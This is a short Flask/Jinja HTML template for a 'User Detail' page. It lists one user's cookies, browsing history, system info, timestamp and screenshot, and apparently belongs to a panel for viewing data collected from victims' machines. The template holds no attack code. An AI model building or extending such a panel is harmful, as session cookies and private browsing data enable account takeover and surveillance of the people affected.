<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>User Detail</title>
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
<h1>User {{ user[1] }}</h1>
<p><strong>Timestamp:</strong> {{ user[6] }}</p>
<h2>Cookies</h2>
<pre>{{ user[2] }}</pre>
<h2>History</h2>
<pre>{{ user[3] }}</pre>
<h2>System Info</h2>
<pre>{{ user[4] }}</pre>
{% if user[5] %}
<h2>Screenshot</h2>
<img src="data:image/png;base64,{{ user[5]|b64encode }}">
{% endif %}
</body>
</html>
